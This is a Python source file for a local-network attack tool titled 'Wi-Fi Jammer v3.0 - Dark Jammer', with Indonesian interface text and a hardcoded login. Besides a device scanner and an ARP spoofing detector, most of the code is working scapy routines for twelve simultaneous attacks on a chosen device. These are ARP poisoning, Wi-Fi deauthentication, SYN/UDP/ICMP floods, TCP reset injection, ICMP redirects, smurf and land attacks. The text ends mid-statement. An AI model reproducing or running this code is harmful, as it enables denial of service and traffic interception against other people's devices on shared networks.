#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║     Wi-Fi Jammer v3.0 - Dark Jammer (FINAL)                              ║
║     ⚠️  12 ATTACK METHODS - TOTAL ANNIHILATION ⚠️                       ║
║     Author: Hamzah Wisnu Dzaky (HamzzXPP)                                ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import time
import json
import random
import string
import threading
import subprocess
import socket
import struct
import hashlib
import getpass
import platform
from datetime import datetime
from collections import defaultdict, OrderedDict
from queue import Queue
import ctypes
import warnings
warnings.filterwarnings("ignore")

# ========== IMPORT TAMBAHAN ==========
try:
    from mac_vendor_lookup import MacLookup
    MAC_LOOKUP_AVAILABLE = True
except ImportError:
    MAC_LOOKUP_AVAILABLE = False
    print("mac_vendor_lookup not installed. Run: pip install mac-vendor-lookup")

# ========== VENDOR DATABASE DENGAN MACVENDORLOOKUP ==========
class VendorDatabase:
    def __init__(self):
        self.cache = {}
        self.initialized = False
        self.init_db()
    
    def init_db(self):
        try:
            from mac_vendor_lookup import MacLookup
            self.mac_lookup = MacLookup()
            print("Loading vendor database (first time may take a moment)...")
            self.mac_lookup.update_vendors()
            self.initialized = True
            print("Vendor database ready! 99% accuracy")
        except ImportError:
            print("mac_vendor_lookup not installed. Install: pip install mac-vendor-lookup")
            self.mac_lookup = None
        except Exception as e:
            print(f"Vendor DB error: {e}")
            self.mac_lookup = None
    
    def get_vendor(self, mac):
        if not mac or mac == "00:00:00:00:00:00" or mac == "FF:FF:FF:FF:FF:FF":
            return "Unknown"
        
        mac_upper = mac.upper()
        
        if mac_upper in self.cache:
            return self.cache[mac_upper]
        
        try:
            if self.mac_lookup and self.initialized:
                vendor = self.mac_lookup.lookup(mac_upper)
                self.cache[mac_upper] = vendor
                return vendor
        except:
            pass
        
        return "Unknown Device"

# ========== CEK ADMIN WINDOWS ==========
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    print("\n" + "="*60)
    print("[!] PERLU AKSES ADMINISTRATOR!")
    print("    Klik kanan CMD → Run as Administrator")
    print("="*60 + "\n")
    sys.exit(1)

print("[+] Running with Administrator privileges!\n")

# ========== CEK DEPENDENCIES ==========
try:
    import scapy.all as scapy
    from scapy.all import ARP, Ether, getmacbyip, IP, TCP, UDP, ICMP, srp, srp1, send, sniff, sendp, fragment
    from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Beacon, RadioTap
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False
    print("[!] Scapy tidak ditemukan. Install: pip install scapy")
    sys.exit(1)

try:
    from colorama import init as colorama_init, Fore, Back, Style
    colorama_init(autoreset=True, convert=True, strip=True)
    COLOR_OK = True
except:
    COLOR_OK = False
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE=BLACK=RESET=''
    class Style: BRIGHT=RESET_ALL=''

try:
    from tqdm import tqdm
    TQDM_OK = True
except:
    TQDM_OK = False
    def tqdm(iterable, **kwargs):
        return iterable

# ========== WARNA LENGKAP ==========
C = {
    "R": Fore.RED, "G": Fore.GREEN, "Y": Fore.YELLOW,
    "B": Fore.BLUE, "M": Fore.MAGENTA, "C": Fore.CYAN,
    "W": Fore.WHITE, "RESET": Style.RESET_ALL, "BOLD": Style.BRIGHT,
    "BLACK": Fore.BLACK, "LRED": Fore.LIGHTRED_EX, "LGREEN": Fore.LIGHTGREEN_EX,
    "LYELLOW": Fore.LIGHTYELLOW_EX, "LBLUE": Fore.LIGHTBLUE_EX, "LMAGENTA": Fore.LIGHTMAGENTA_EX,
    "LCYAN": Fore.LIGHTCYAN_EX, "LWHITE": Fore.LIGHTWHITE_EX
}

# ========== EMOJI LENGKAP ==========
EMO = {
    "wifi": "📡", "shield": "🛡️", "target": "🎯", "alert": "⚠️",
    "check": "✅", "cross": "❌", "scan": "🔍", "net": "🌐",
    "device": "💻", "router": "📶", "attack": "⚔️", "protect": "🛡️",
    "info": "ℹ️", "packet": "📦", "login": "🔐", "key": "🔑",
    "power": "⚡", "database": "🗄️", "hack": "🤖", "warning": "🚨",
    "fire": "🔥", "crown": "👑", "star": "⭐", "time": "⏰",
    "speed": "⚡", "secure": "🔒", "danger": "💀", "skull": "💀",
    "bug": "🐛", "tool": "🔧", "menu": "📋", "exit": "🚪",
    "back": "🔙", "next": "🔜", "up": "⬆️", "down": "⬇️",
    "left": "⬅️", "right": "➡️", "plus": "➕", "minus": "➖",
    "apocalypse": "🌋", "death": "💀", "lightning": "⚡", "nuke": "☢️", "stats": "📊"
}

# ========== LOGIN SYSTEM ENHANCED ==========
class LoginSystem:
    def __init__(self):
        self.max_attempts = 3
        self.lockout_time = 60
        self.attempts = 0
        self.lockout_until = None
        self.valid_username = "admin"
        self.valid_password = "Hamzah123"
        
    def show_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{C['BOLD']}{C['R']}╔══════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['R']}║{C['RESET']}                                                          {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}  {C['BOLD']}{C['Y']}{EMO['crown']} Wi-Fi Jammer v3.0 - DARK JAMMER              {EMO['apocalypse']}{C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}  {C['BOLD']}{C['M']}{EMO['danger']} 12 ATTACK METHODS - TOTAL ANNIHILATION!            {EMO['death']}{C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}  {C['BOLD']}{C['C']}{EMO['secure']} HANYA UNTUK UJI KEAMANAN JARINGAN SENDIRI!          {EMO['secure']}{C['RESET']}{C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}                                                                              {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}╚══════════════════════════════════════════════════════════════════════════╝{C['RESET']}

{C['BOLD']}{C['C']}{EMO['login']} AUTHENTICATION REQUIRED {EMO['login']}{C['RESET']}
{C['Y']}────────────────────────────────────────────────────────────────{C['RESET']}
        """)
    
    def login(self):
        while self.attempts < self.max_attempts:
            self.show_banner()
            
            if self.lockout_until and time.time() < self.lockout_until:
                remaining = int(self.lockout_until - time.time())
                print(f"\n{C['R']}{EMO['warning']} TERKUNCI! Tunggu {remaining} detik...{C['RESET']}")
                time.sleep(remaining)
                self.lockout_until = None
                continue
            
            print(f"\n{C['BOLD']}{C['G']}{EMO['key']} LOGIN CREDENTIALS {EMO['key']}{C['RESET']}\n")
            
            username = input(f"  {C['C']}📝 Username:{C['RESET']} ")
            password = getpass.getpass(f"  {C['C']}🔒 Password:{C['RESET']} ")
            
            if username == self.valid_username and password == self.valid_password:
                print(f"\n{C['G']}{EMO['check']} LOGIN BERHASIL! Selamat datang, {username}!{C['RESET']}")
                print(f"{C['G']}{EMO['shield']} Membuka Wi-Fi Jammer v3.0 DARK JAMMER...{C['RESET']}\n")
                
                for i in range(3):
                    print(f"{C['R']}{EMO['apocalypse']} Loading{'.' * (i+1)}{' ' * (3-i-1)}{C['RESET']}", end='\r')
                    time.sleep(0.5)
                print("\n")
                return True
            else:
                self.attempts += 1
                remaining = self.max_attempts - self.attempts
                print(f"\n{C['R']}{EMO['cross']} LOGIN GAGAL! Username atau password salah!{C['RESET']}")
                print(f"{C['Y']}Sisa percobaan: {remaining}{C['RESET']}")
                
                if remaining == 0:
                    print(f"\n{C['R']}{EMO['danger']} TERKUNCI 60 DETIK!{C['RESET']}")
                    self.lockout_until = time.time() + self.lockout_time
                    self.attempts = 0
                    time.sleep(2)
                else:
                    time.sleep(1.5)
        
        return False

# ========== NETWORK TESTER UTAMA ==========
class UltimateNetworkTester:
    def __init__(self):
        self.interface = self.get_interface()
        self.targets = {}
        self.running = False
        self.arp_table = {}
        self.gateway_ip = None
        self.gateway_mac = None
        self.my_ip = None
        self.my_mac = None
        self.attack_log = []
        self.packet_stats = defaultdict(int)
        self.vendor_db = VendorDatabase()
        self.log_file = f"apocalypse_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        self.backup_file = f"network_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        self.stop_event = threading.Event()
        self.blocked_devices = {}
        
    def log_event(self, event_type, target, details, severity="INFO"):
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'event_type': event_type,
            'target': target,
            'details': details,
            'severity': severity,
            'ip': self.my_ip,
            'interface': self.interface,
            'os': platform.system()
        }
        self.attack_log.append(log_entry)
        
        try:
            with open(self.log_file, 'w') as f:
                json.dump(self.attack_log, f, indent=2)
        except:
            pass
        
        if severity == "CRITICAL":
            print(f"{C['R']}{EMO['death']} [{severity}] {event_type}: {details}{C['RESET']}")
        elif severity == "HIGH":
            print(f"{C['R']}{EMO['alert']} [{severity}] {event_type}: {details}{C['RESET']}")
        elif severity == "MEDIUM":
            print(f"{C['Y']}{EMO['warning']} [{severity}] {event_type}: {details}{C['RESET']}")
        else:
            print(f"{C['G']}{EMO['info']} [{severity}] {event_type}: {details}{C['RESET']}")
    
    def get_interface(self):
        try:
            if os.name == 'nt':
                result = subprocess.run(['netsh', 'interface', 'show', 'interface'], 
                                       capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Wi-Fi' in line or 'Wireless' in line:
                        if 'Connected' in line:
                            parts = line.split()
                            return parts[-1] if parts else "Wi-Fi"
                return "Wi-Fi"
            else:
                result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'default' in line and 'dev' in line:
                        parts = line.split()
                        idx = parts.index('dev')
                        return parts[idx + 1]
        except:
            pass
        return 'wlan0' if os.name != 'nt' else "Wi-Fi"
    
    def get_my_ip(self):
        methods = [
            lambda: socket.gethostbyname(socket.gethostname()),
            lambda: next((ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] 
                         if not ip.startswith('127.')), None),
            lambda: self._get_ip_from_route()
        ]
        
        for method in methods:
            try:
                ip = method()
                if ip and ip != '127.0.0.1':
                    return ip
            except:
                continue
        return "192.168.1.100"
    
    def _get_ip_from_route(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def get_my_mac(self):
        try:
            if os.name == 'nt':
                result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True)
                lines = result.stdout.split('\n')
                in_wifi = False
                for line in lines:
                    if 'Wi-Fi' in line or 'Wireless LAN' in line:
                        in_wifi = True
                    if in_wifi and 'Physical Address' in line:
                        mac = line.split(':')[-1].strip()
                        if mac and mac != '00-00-00-00-00-00':
                            return mac.replace('-', ':').upper()
                
                result = subprocess.run(['getmac', '/v', '/fo', 'list'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Physical Address' in line and ('Wi-Fi' in result.stdout or 'Wireless' in result.stdout):
                        mac = line.split(':')[-1].strip()
                        if mac and mac != '00-00-00-00-00-00':
                            return mac.replace('-', ':').upper()
            else:
                result = subprocess.run(['ip', 'link', 'show', self.interface], capture_output=True, text=True)
                match = re.search(r'link/ether ([0-9a-f:]+)', result.stdout.lower())
                if match:
                    return match.group(1).upper()
        except Exception as e:
            print(f"MAC detection error: {e}")
        
        print(f"\n{C['Y']}Gagal deteksi MAC address otomatis{C['RESET']}")
        print(f"{C['C']}Cek MAC: CMD → ipconfig /all → cari 'Physical Address' WiFi{C['RESET']}")
        manual_mac = input(f"{C['B']}Masukkan MAC address (contoh: FC:70:2E:7D:46:13): {C['RESET']}")
        return manual_mac.replace('-', ':').upper() if manual_mac else "FF:FF:FF:FF:FF:FF"
    
    def get_gateway(self):
        try:
            if os.name == 'nt':
                result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'Default Gateway' in line and '.' in line:
                        ip = line.split(':')[-1].strip()
                        if ip and ip != '':
                            try:
                                mac = getmacbyip(ip)
                                return ip, mac
                            except:
                                return ip, None
            else:
                result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if 'default' in line and 'via' in line:
                        parts = line.split()
                        ip = parts[parts.index('via') + 1]
                        try:
                            mac = getmacbyip(ip)
                            return ip, mac
                        except:
                            return ip, None
        except:
            pass
        return "192.168.1.1", None
    
    def scan_network_advanced(self, ip_range=None):
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['scan']} ADVANCED NETWORK SCANNER {EMO['scan']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        if not ip_range:
            my_ip = self.get_my_ip()
            if my_ip:
                ip_parts = my_ip.split('.')
                ip_range = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
            else:
                ip_range = "192.168.1.0/24"
        
        print(f"\n{C['C']}📡 Target Range: {ip_range}{C['RESET']}")
        print(f"{C['C']}🔌 Interface: {self.interface}{C['RESET']}")
        print(f"{C['Y']}{EMO['time']} Memulai scanning...{C['RESET']}\n")
        
        try:
            arp = ARP(pdst=ip_range)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            if TQDM_OK:
                result = srp(packet, timeout=3, verbose=False, iface=self.interface)[0]
            else:
                print("Scanning...")
                result = srp(packet, timeout=3, verbose=False, iface=self.interface)[0]
            
            devices = []
            for sent, received in result:
                device = {
                    'ip': received.psrc,
                    'mac': received.hwsrc,
                    'vendor': self.vendor_db.get_vendor(received.hwsrc),
                    'hostname': self.get_hostname(received.psrc)
                }
                devices.append(device)
                self.arp_table[device['ip']] = device['mac']
            
            print(f"\n{C['BOLD']}{C['G']}{'='*70}{C['RESET']}")
            print(f"{C['BOLD']}{C['G']}{EMO['net']} DEVICES DETECTED: {len(devices)} {EMO['net']}{C['RESET']}")
            print(f"{C['BOLD']}{C['G']}{'='*70}{C['RESET']}")
            print(f"{C['BOLD']}{'No.':<5} {'IP Address':<18} {'MAC Address':<20} {'Device Type':<25}{C['RESET']}")
            print(f"{C['C']}{'-'*70}{C['RESET']}")
            
            for i, d in enumerate(devices, 1):
                print(f"{i:<5} {d['ip']:<18} {d['mac']:<20} {d['vendor'][:25]:<25}")
            
            print(f"{C['C']}{'='*70}{C['RESET']}")
            
            gateway_ip, gateway_mac = self.get_gateway()
            my_ip = self.get_my_ip()
            
            if gateway_ip:
                gw_vendor = self.vendor_db.get_vendor(gateway_mac) if gateway_mac else "Router"
                print(f"\n{C['Y']}{EMO['router']} GATEWAY: {gateway_ip} ({gateway_mac}) - {gw_vendor}{C['RESET']}")
            if my_ip:
                my_vendor = self.vendor_db.get_vendor(self.my_mac) if self.my_mac else "Computer"
                print(f"{C['G']}{EMO['device']} YOUR DEVICE: {my_ip} ({self.my_mac}) - {my_vendor}{C['RESET']}")
            
            self.log_event('SCAN', ip_range, f'Found {len(devices)} devices', 'INFO')
            return devices
            
        except Exception as e:
            print(f"{C['R']}{EMO['cross']} Scan error: {e}{C['RESET']}")
            self.log_event('ERROR', 'SCAN', str(e), 'HIGH')
            return []
    
    def get_hostname(self, ip):
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname.split('.')[0]
        except:
            return "Unknown"
    
    def arp_spoofing_detection_pro(self, duration=120):
        print(f"\n{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['Y']}{EMO['protect']} PRO ARP SPOOFING DETECTOR {EMO['protect']}{C['RESET']}")
        print(f"{C['BOLD']}{C['C']}{'='*70}{C['RESET']}")
        
        gateway_ip, gateway_mac = self.get_gateway()
        if not gateway_ip:
            print(f"{C['R']}Cannot detect gateway!{C['RESET']}")
            return
        
        print(f"\n{C['C']}Gateway: {gateway_ip} -> {gateway_mac}{C['RESET']}")
        print(f"{C['Y']}{EMO['time']} Monitoring selama {duration} detik...{C['RESET']}")
        
        detected = False
        attack_count = defaultdict(int)
        attackers = []
        mitigation_triggered = False
        
        def arp_monitor(pkt):
            nonlocal detected, mitigation_triggered
            if pkt.haslayer(ARP) and pkt[ARP].op == 2:
                ip = pkt[ARP].psrc
                mac = pkt[ARP].hwsrc
                
                if ip == gateway_ip and gateway_mac and mac != gateway_mac:
                    attack_count[mac] += 1
                    
                    if attack_count[mac] >= 3 and not detected:
                        detected = True
                        attackers.append({'ip': ip, 'mac': mac, 'count': attack_count[mac]})
                        
                        print(f"\n{C['R']}{EMO['danger']} {'='*60}{C['RESET']}")
                        print(f"{C['R']}{EMO['alert']} ARP SPOOFING ATTACK DETECTED! {EMO['alert']}{C['RESET']}")
                        print(f"{C['R']}{'='*60}{C['RESET']}")
                        print(f"  {C['Y']}Target IP:{C['RESET']} {ip}")
                        print(f"  {C['G']}Real MAC:{C['RESET']} {gateway_mac}")
                        print(f"  {C['R']}Fake MAC:{C['RESET']} {mac}")
                        print(f"  {C['R']}Attacker:{C['RESET']} {self.vendor_db.get_vendor(mac)}")
                        print(f"  {C['Y']}Attack Count:{C['RESET']} {attack_count[mac]}")
                        
                        self.log_event('ARP_SPOOF', ip, f'Attack from {mac}', 'CRITICAL')
                        
                        if not mitigation_triggered:
                            print(f"\n{C['Y']}{EMO['shield']} Auto-mitigation available{C['RESET']}")
                            mitigation_triggered = True
        
        try:
            sniff(prn=arp_monitor, filter="arp", timeout=duration, iface=self.interface, store=0)
        except Exception as e:
            print(f"{C['R']}Sniffing error: {e}{C['RESET']}")
        
        if not detected:
            print(f"\n{C['G']}{EMO['check']} AMAN! No ARP spoofing detected{C['RESET']}")
            self.log_event('MONITOR', 'ARP', 'No spoofing detected', 'INFO')
        
        return detected, attackers
    
    # ========== 12 METODE ATTACK UNTUK DEVICE BLOCKER ==========
    
    def generate_random_mac(self):
        """Generate random MAC address untuk stealth mode"""
        return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)]).upper()
    
    # METHOD 1: EXTREME ARP POISONING
    def arp_poison_extreme(self, target_ip, target_mac, gateway_ip, gateway_mac):
        """METHOD 1: EXTREME ARP POISONING - 3x threads, random MAC"""
        rate = 0.03
        while self.running and not self.stop_event.is_set():
            try:
                fake_mac = self.generate_random_mac()
                packet1 = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                             psrc=gateway_ip, hwsrc=fake_mac)
                packet2 = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                             psrc=target_ip, hwsrc=fake_mac)
                send(packet1, verbose=False, iface=self.interface)
                send(packet2, verbose=False, iface=self.interface)
                self.packet_stats['💀 ARP_POISON'] += 2
                time.sleep(rate)
            except:
                pass
    
    # METHOD 2: DEAUTH FLOOD (WiFi kick)
    def deauth_flood(self, target_mac, bssid):
        """METHOD 2: DEAUTH FLOOD - Kick dari WiFi (Linux only)"""
        if os.name == 'nt':
            return
        while self.running and not self.stop_event.is_set():
            try:
                for _ in range(10):
                    packet = RadioTap()/Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                    sendp(packet, iface=self.interface, verbose=False)
                self.packet_stats['📡 DEAUTH'] += 10
                time.sleep(0.3)
            except:
                pass
    
    # METHOD 3: ICMP PING FLOOD
    def icmp_flood(self, target_ip):
        """METHOD 3: ICMP FLOOD - Ping of death dengan payload besar"""
        while self.running and not self.stop_event.is_set():
            try:
                for size in [1024, 2048, 4096]:
                    packet = IP(dst=target_ip)/ICMP()/("X" * size)
                    send(packet, verbose=False, iface=self.interface, count=3)
                self.packet_stats['🔊 ICMP_FLOOD'] += 9
                time.sleep(0.2)
            except:
                pass
    
    # METHOD 4: TCP RST ATTACK
    def tcp_rst_attack(self, target_ip):
        """METHOD 4: TCP RST - Reset semua koneksi TCP"""
        common_ports = [80, 443, 53, 8080, 22, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900, 445, 139]
        while self.running and not self.stop_event.is_set():
            try:
                for port in common_ports:
                    packet = IP(dst=target_ip)/TCP(dport=port, sport=random.randint(1024, 65535), flags="R")
                    send(packet, verbose=False, iface=self.interface)
                self.packet_stats['🔌 TCP_RST'] += len(common_ports)
                time.sleep(0.2)
            except:
                pass
    
    # METHOD 5: UDP FLOOD
    def udp_flood(self, target_ip):
        """METHOD 5: UDP FLOOD - Overload UDP ports"""
        udp_ports = [53, 67, 68, 123, 161, 443, 500, 1701, 4500, 5353, 1900, 3702, 5355]
        while self.running and not self.stop_event.is_set():
            try:
                for port in udp_ports:
                    packet = IP(dst=target_ip)/UDP(dport=port, sport=random.randint(1024, 65535))/("X" * random.randint(100, 500))
                    send(packet, verbose=False, iface=self.interface)
                self.packet_stats['📦 UDP_FLOOD'] += len(udp_ports)
                time.sleep(0.15)
            except:
                pass
    
    # METHOD 6: SYN FLOOD (Half-open connections)
    def syn_flood(self, target_ip):
        """METHOD 6: SYN FLOOD - Half-open connections attack"""
        ports = [80, 443, 22, 8080, 3306, 5432, 3389, 5900, 445, 139, 25, 110, 143, 993, 995]
        while self.running and not self.stop_event.is_set():
            try:
                for port in ports:
                    packet = IP(dst=target_ip)/TCP(dport=port, sport=random.randint(1024, 65535), flags="S")
                    send(packet, verbose=False, iface=self.interface)
                self.packet_stats['🔄 SYN_FLOOD'] += len(ports)
                time.sleep(0.1)
            except:
                pass
    
    # METHOD 7: ICMP REDIRECT ATTACK
    def icmp_redirect(self, target_ip, gateway_ip):
        """METHOD 7: ICMP REDIRECT - Redirect traffic ke nowhere"""
        while self.running and not self.stop_event.is_set():
            try:
                packet = IP(src=gateway_ip, dst=target_ip)/ICMP(type=5, code=1)/IP(src=target_ip, dst="8.8.8.8")/ICMP()
                send(packet, verbose=False, iface=self.interface)
                self.packet_stats['🔄 ICMP_REDIRECT'] += 1
                time.sleep(0.5)
            except:
                pass
    
    # METHOD 8: BROADCAST AMPLIFIER
    def broadcast_amplifier(self, target_ip):
        """METHOD 8: BROADCAST AMP - Amplify network traffic"""
        broadcast_addr = "255.255.255.255"
        while self.running and not self.stop_event.is_set():
            try:
                packet = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=target_ip, dst=broadcast_addr)/ICMP()/("X" * 512)
                sendp(packet, iface=self.interface, verbose=False, count=3)
                self.packet_stats['📢 BROADCAST_AMP'] += 3
                time.sleep(0.2)
            except:
                pass
    
    # METHOD 9: GHOST CONNECTION ATTACK
    def ghost_connection(self, target_ip, target_mac):
        """METHOD 9: GHOST CONNECTION - Flood dengan fake connections"""
        fake_ips = [f"192.168.1.{i}" for i in range(2, 255) if i != int(target_ip.split('.')[-1])]
        while self.running and not self.stop_event.is_set():
            try:
                for fake_ip in random.sample(fake_ips, min(20, len(fake_ips))):
                    packet = ARP(op=2, psrc=fake_ip, hwsrc=self.generate_random_mac(), pdst=target_ip, hwdst=target_mac)
                    send(packet, verbose=False, iface=self.interface)
                self.packet_stats['👻 GHOST_CONN'] += 20
                time.sleep(0.3)
            except:
                pass
    
    # METHOD 10: PORT EXHAUSTION
    def port_exhaustion(self, target_ip):
        """METHOD 10: PORT EXHAUSTION - Habiskan semua port target"""
        while self.running and not self.stop_event.is_set():
            try:
                for port in range(1, 1025, 20):
                    packet = IP(dst=target_ip)/TCP(dport=port, sport=random.randint(1024, 65535), flags="S")
                    send(packet, verbose=False, iface=self.interface)
                self.packet_stats['🚪 PORT_EXHAUST'] += 51
                time.sleep(0.3)
            except:
                pass
    
    # METHOD 11: SMURF ATTACK (ICMP Echo Request ke broadcast)
    def smurf_attack(self, target_ip):
        """METHOD 11: SMURF ATTACK - Amplified ping attack"""
        broadcast_addr = "255.255.255.255"
        while self.running and not self.stop_event.is_set():
            try:
                packet = IP(src=target_ip, dst=broadcast_addr)/ICMP()
                send(packet, verbose=False, iface=self.interface, count=5)
                self.packet_stats['🎯 SMURF'] += 5
                time.sleep(0.2)
            except:
                pass
    
    # METHOD 12: LAND ATTACK (SYN packet with same src/dst)
    def land_attack(self, target_ip):
        """METHOD 12: LAND ATTACK - SYN packet dengan src=target dst=target"""
        while self.running and not self.stop_event.is_set():
            try:
                packet = IP(src=target_ip, dst=target_ip)/TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
                send(packet, verbose=False, iface=self.interface)
                self.packet_stats['🏔️ LAND_ATTACK'] += 1
                time.sleep(0.3)
            except:
                pass
    
    # ========== APOCALYPSE DEVICE BLOCKER - 12 METHODS ==========
    
    def block_device_apocalypse(self, target_ip):
        """DARK DEVICE BLOCKER - 12 METHODS SIMULTANEOUSLY"""
        print(f"\n{C['BOLD']}{C['R']}{'='*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['R']}{EMO['apocalypse']} DARK DEVICE BLOCKER v3.0 {EMO['death']}{C['RESET']}")
        print(f"{C['BOLD']}{C['R']}{'='*70}{C['RESET']}")
        print(f"{C['R']}{EMO['danger']} PERINGATAN: 12 METODE ATTACK - TOTAL ANNIHILATION!{C['RESET']}")
        
        # Refresh ARP table
        if target_ip not in self.arp_table:
            print(f"{C['Y']}Target not in cache, scanning...{C['RESET']}")
            self.scan_network_advanced()
        
        if target_ip not in self.arp_table:
            print(f"{C['R']}Target not found!{C['RESET']}")
            return
        
        target_mac = self.arp_table[target_ip]
        gateway_ip, gateway_mac = self.get_gateway()
        
        if not gateway_ip:
            print(f"{C['R']}Cannot detect gateway!{C['RESET']}")
            return
        
        vendor = self.vendor_db.get_vendor(target_mac)
        
        print(f"\n{C['R']}{'█'*70}{C['RESET']}")
        print(f"{C['BOLD']}{C['R']}💀 TARGET ACQUIRED - PREPARING 12 METHOD ATTACK 💀{C['RESET']}")
        print(f"{C['R']}{'█'*70}{C['RESET']}")
        print(f"""
{C['Y']}┌─────────────────────────────────────────────────────────────────────┐
│  {C['W']}IP Address:     {C['R']}{target_ip:<47}{C['Y']}│
│  {C['W']}MAC Address:    {C['R']}{target_mac:<47}{C['Y']}│
│  {C['W']}Device Type:    {C['R']}{vendor:<47}{C['Y']}│
│  {C['W']}Gateway:        {C['R']}{gateway_ip:<47}{C['Y']}│
│  {C['W']}Attack Methods: {C['R']}12 SIMULTANEOUS ATTACKS{C['Y']}│
└─────────────────────────────────────────────────────────────────────┘
        """)
        
        confirm = input(f"\n{C['R']}{EMO['death']} KONFIRMASI NETWORK DARK BLOCK? (ketik 'DARK'): {C['RESET']}")
        if confirm.upper() != 'DARK':
            print(f"{C['Y']}Operation cancelled{C['RESET']}")
            return
        
        print(f"\n{C['R']}{EMO['DARK']} MELUNCURKAN 12 METODE ATTACK... {EMO['fire']}{C['RESET']}")
        print(f"{C['Y']}{EMO['alert']} Tekan Ctrl+C untuk menghentikan block{C['RESET']}\n")
        
        self.running = True
        self.stop_event.clear()
        self.blocked_devices[target_ip] = {
            'mac': target_mac,
            'vendor': vendor,
            'start_time': datetime.now(),
            'methods': 12
        }
        
        self.log_event('APOCALYPSE_BLOCK', target_ip, f'12 methods on {vendor}', 'CRITICAL')
        
        attack_threads = []
        
        # METHOD 1: ARP Poisoning (3 threads untuk power max)
        for i in range(3):
            t = threading.Thread(target=self.arp_poison_extreme, args=(target_ip, target_mac, gateway_ip, gateway_mac))
            t.daemon = True
            t.start()
            attack_threads.append(t)
        
        # METHOD 2: Deauth Flood (Linux only)
        if os.name != 'nt':
            t = threading.Thread(target=self.deauth_flood, args=(target_mac, gateway_mac))
            t.daemon = True
            t.start()
            attack_threads.append(t)
        
        # METHOD 3: ICMP Flood
        t = threading.Thread(target=self.icmp_flood, args=(target_ip,))
        t.daemon = True
        t.start()
        attack_threads.append(t)
        
        # METHOD 4: TCP RST Attack
        t = threading.Thread(target=self.tcp_rst_attack, args=(target_ip,))
        t.daemon = True
        t.start()
        attack_threads.append(t)
        
        # METHOD 5: UDP Flood
        t = threading.Thread(target=self.udp_flood, args=(target_ip,))
        t.daemon = True
        t.start()
        attack_threads.append(t)
        
        # METHOD 6: SYN Flood
        t = threading.Thread(target=self.syn_flood, args=(target_ip,))
        t.daemon = True
        t.start()
        attack_threads.append(t)
        
        # METHOD 7: ICMP Redirect
        t = threading.Thread(target=self.icmp_redirect, args=(target_ip, gateway_ip))
        t.daemon = True
        t.start()
        attack_threads.append(t)
        
        # METHOD 8: Broadcast Amplifier
        t = threading.Thread(target=self.broadcast_amplifier, args=(target_ip,))
        t.daemon = True
        t.start()
        attack_threads.append(t)
        
        # METHOD 9: Ghost Connection
        t = threading.Thread(target=self.ghost_connection, args=(target_ip, target_mac))
        t.daemon = True
        t.start()
        attack_threads.append(t)
        
        # METHOD 10: Port Exhaustion
        t = threading.Thread(target=self.port_exhaustion, args=(target_ip,))
        t.daemon = True
        t.start()
        attack_threads.append(t)
        
        # METHOD 11: Smurf Attack
        t = threading.Thread(target=self.smurf_attack, args=(target_ip,))
        t.daemon = True
        t.start()
        attack_threads.append(t)
        
        # METHOD 12: Land Attack
        t = threading.Thread(target=self.land_attack, args=(target_ip,))
        t.daemon = True
        t.start()
        attack_threads.append(t)
        
        start_time = time.time()
        
        try:
            with tqdm(total=100, desc=f"💀 DARK BLOCKING {target_ip}", unit="%") as pbar:
                while self.running:
                    time.sleep(0.5)
                    total_packets = sum(self.packet_stats.values())
                    progress = min(100, total_packets / 50)
                    pbar.update(progress - pbar.n)
                    pbar.set_postfix({
                        "Packets": total_packets,
                        "Methods": 12,
                        "Status": "💀 KILLING"
                    })
                    
        except KeyboardInterrupt:
            self.running = False
            self.stop_event.set()
            self.restore_network()
            
            duration = int(time.time() - start_time)
            total_packets = sum(self.packet_stats.values())
            
            print(f"\n\n{C['G']}{'='*70}{C['RESET']}")
            print(f"{C['G']}{EMO['check']} NETWORK DARK BLOCKING COMPLETE!{C['RESET']}")
            print(f"{C['G']}{'='*70}{C['RESET']}")
            print(f"""
